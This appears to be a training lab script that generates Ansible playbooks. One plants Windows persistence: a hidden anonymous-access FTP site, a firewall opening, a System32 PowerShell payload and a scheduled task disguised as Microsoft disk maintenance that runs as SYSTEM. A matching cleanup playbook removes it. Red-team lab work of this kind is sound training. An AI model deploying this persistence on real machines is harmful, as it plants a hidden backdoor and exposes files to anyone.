#!/bin/bash

# --- 1. CONFIGURATION ---
# Edit these variables before running
TARGET_IP_1="192.168.1.10"
TARGET_IP_2="192.168.1.11"
WIN_USER="Administrator"
WIN_PASS="YourSecurePassword!"

echo "🚀 Starting Red Team / Blue Team Lab Setup..."

# --- 2. ANSIBLE ENVIRONMENT CHECK ---
if ! command -v ansible &> /dev/null; then
    echo "❌ Ansible not found. Please install it first (sudo apt install ansible)."
    exit 1
fi

echo "[+] Installing community.windows and ansible.windows collections..."
ansible-galaxy collection install community.windows --quiet
ansible-galaxy collection install ansible.windows --quiet

# --- 3. DIRECTORY STRUCTURE ---
PROJECT_DIR="cyber_lab_project"
mkdir -p $PROJECT_DIR
cd $PROJECT_DIR

# --- 4. CREATE INVENTORY (hosts.ini) ---
echo "[+] Generating hosts.ini..."
cat <<EOF > hosts.ini
[windows_targets]
win-lab-01 ansible_host=$TARGET_IP_1
win-lab-02 ansible_host=$TARGET_IP_2

[windows_targets:vars]
ansible_user=$WIN_USER
ansible_password=$WIN_PASS
ansible_connection=winrm
ansible_winrm_server_cert_validation=ignore
EOF

# --- 5. CREATE RED TEAM PLAYBOOK ---
echo "[+] Generating deploy_persistence.yml..."
cat <<'EOF' > deploy_persistence.yml
---
- name: Full Spectrum Persistent FTP Simulation
  hosts: windows_targets
  gather_facts: yes
  vars:
    ftp_site_name: "Win_Legacy_Svc"
    ftp_root: "C:\\Windows\\Logs\\FTP_Archive"
    payload_path: "C:\\Windows\\System32\\Tasks_Config.ps1"
    task_name: "Microsoft-Windows-Disk-Maintenance"

  tasks:
    - name: Ensure Root Directory Exists
      ansible.windows.win_file:
        path: "{{ ftp_root }}"
        state: directory

    - name: Install FTP Components
      block:
        - community.windows.win_feature:
            name: [Web-Server, Web-FTP-Server, Web-FTP-Service]
            state: present
          when: ansible_windows_product_type == "Server"
        - community.windows.win_optional_feature:
            name: [IIS-WebServerRole, IIS-FTPServer, IIS-FTPSvc]
            state: enabled
          when: ansible_windows_product_type != "Server"

    - name: Drop Persistence Payload
      ansible.windows.win_copy:
        dest: "{{ payload_path }}"
        content: |
          Import-Module WebAdministration
          if (!(Get-Website -Name "{{ ftp_site_name }}")) {
              New-WebFtpSite -Name "{{ ftp_site_name }}" -Port 2121 -PhysicalPath "{{ ftp_root }}"
          }
          Start-WebItem "IIS:\Sites\{{ ftp_site_name }}"
          Set-WebConfigurationProperty -Filter "/system.ftpServer/security/authentication/anonymousAuthentication" -Name "enabled" -Value "True" -PSPath "IIS:\" -Location "{{ ftp_site_name }}"
          Set-WebConfigurationProperty -Filter "/system.ftpServer/security/ssl" -Name "controlChannelPolicy" -Value "SslAllow" -PSPath "IIS:\" -Location "{{ ftp_site_name }}"
          if (!(Get-NetFirewallRule -DisplayName "FTP-In" -ErrorAction SilentlyContinue)) {
              New-NetFirewallRule -DisplayName "FTP-In" -LocalPort 2121 -Action Allow -Direction Inbound -Protocol TCP
          }

    - name: Create Obfuscated Scheduled Task
      community.windows.win_scheduled_task:
        name: "{{ task_name }}"
        executable: powershell.exe
        arguments: -ExecutionPolicy Bypass -WindowStyle Hidden -File "{{ payload_path }}"
        time_trigger:
          start_boundary: '2024-01-01T00:00:00'
          repetition:
            interval: PT15M
        state: present
        username: SYSTEM
        run_level: highest
EOF

# --- 6. CREATE BLUE TEAM CLEANUP ---
echo "[+] Generating cleanup_breach.yml..."
cat <<'EOF' > cleanup_breach.yml
---
- name: Blue Team Nuclear Cleanup
  hosts: windows_targets
  tasks:
    - name: Remove Persistence Task
      community.windows.win_scheduled_task:
        name: "Microsoft-Windows-Disk-Maintenance"
        state: absent

    - name: Remove Site and Config
      community.windows.win_iis_website:
        name: "Win_Legacy_Svc"
        state: absent

    - name: Remove Firewall Rule
      community.windows.win_firewall_rule:
        name: "FTP-In"
        state: absent

    - name: Cleanup Payload Files
      ansible.windows.win_file:
        path: "{{ item }}"
        state: absent
      loop:
        - "C:\\Windows\\System32\\Tasks_Config.ps1"
        - "C:\\Windows\\Logs\\FTP_Archive"
EOF

echo "---"
echo "✅ SETUP COMPLETE!"
echo "Your project is in the '$PROJECT_DIR' folder."
echo "1. Verify connectivity: ansible windows_targets -i hosts.ini -m win_ping"
echo "2. Deploy Red Team:      ansible-playbook -i hosts.ini deploy_persistence.yml"
echo "3. Run Blue Cleanup:    ansible-playbook -i hosts.ini cleanup_breach.yml"